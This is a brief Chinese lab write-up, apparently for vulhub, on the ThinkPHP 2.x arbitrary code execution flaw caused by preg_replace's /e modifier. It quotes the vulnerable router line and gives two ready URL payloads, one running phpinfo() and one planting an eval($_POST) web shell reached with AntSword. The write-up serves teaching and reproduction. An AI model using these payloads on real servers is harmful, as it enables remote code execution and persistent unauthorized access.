# ThinkPHP 2.x 任意代码执行漏洞

###### by ADummy

### 0x00利用路线

​			直接url执行代码

### 0x01漏洞介绍

​			ThinkPHP 2.x版本中，使用`preg_replace`的`/e`模式匹配路由：

```php
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```

​			导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。

​			ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞

### 0x02漏洞复现

#### payload1(phpinfo)：

http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D

#### payload2(一句话木马)：

http://your-ip:8080/index.php?s=/index/index/name/${print(eval($_POST[1]))}



​			**默认页面**

![ThinkPHP2_x_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ThinkPHP2_x_rce_1.jpg)



​			**第一个payload，phpinfo()被执行**

![ThinkPHP2_x_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ThinkPHP2_x_rce_2.jpg)

​				

​			**第二个payload，使用蚁剑连接**

![ThinkPHP2_x_rce_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ThinkPHP2_x_rce_3.jpg)

​	

### 0x03参考资料

https://www.cnblogs.com/g0udan/p/12252383.html
